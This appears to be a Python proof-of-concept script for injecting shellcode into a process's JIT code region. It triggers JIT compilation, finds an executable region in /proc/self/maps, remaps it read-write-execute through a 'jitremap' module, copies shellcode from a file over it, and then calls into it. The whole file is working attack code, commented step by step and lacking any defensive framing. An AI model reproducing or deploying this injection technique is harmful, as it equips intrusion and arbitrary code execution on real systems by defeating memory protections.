import os
import ctypes
import jitremap

PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
PAGE_SIZE = 0x1000

# -------------------------------
# Step 1: Define hot function to trigger JIT
# -------------------------------
def hot_loop(x):
    total = 0
    for _ in range(100_000):
        total += x * 2
    return total

print("[*] Triggering JIT...")
for _ in range(100):
    hot_loop(42)

# -------------------------------
# Step 2: Find JIT code cache address
# -------------------------------
def find_jit_code_ranges():
    with open("/proc/self/maps") as f:
        for line in f:
            if "r-xp" in line and ("jit" in line.lower() or "[anon" in line):
                parts = line.split()
                start, end = [int(x, 16) for x in parts[0].split("-")]
                print(f"[*] JIT code region found: 0x{start:x}-0x{end:x}")
                return start, end
    return None, None

jit_start, jit_end = find_jit_code_ranges()
if jit_start is None:
    raise RuntimeError("[!] JIT region not found")

# -------------------------------
# Step 3: Load shellcode and compute size
# -------------------------------
shellcode_path = "shellcode.bin"
with open(shellcode_path, "rb") as f:
    shellcode = f.read()

shellcode_size = len(shellcode)
remap_size = ((shellcode_size + PAGE_SIZE - 1) // PAGE_SIZE) * PAGE_SIZE

print(f"[*] Loaded {shellcode_size} bytes of shellcode")
print(f"[*] Remapping JIT region with {remap_size} bytes (aligned to page size)")

# -------------------------------
# Step 4: Attempt to remap as RWX
# -------------------------------
print("[*] Attempting to set RWX permissions on JIT page...")
result = jitremap.remap(jit_start, remap_size, PROT_READ | PROT_WRITE | PROT_EXEC)
print("[*] mprotect result:", result, flush=True)

if result is not True:
    raise RuntimeError("[-] mprotect failed - can't continue")

# ✅ 추가된 출력 + 일시 정지
print(f"[*] JIT region remapped: 0x{jit_start:x}", flush=True)
input(">>> Press ENTER to check /proc/self/smaps...")

# -------------------------------
# Step 5: Inject and execute shellcode
# -------------------------------
ctypes.memmove(jit_start, shellcode, shellcode_size)

FUNC = ctypes.CFUNCTYPE(None)
fn = FUNC(jit_start)
print("[*] Jumping to shellcode...")
fn()

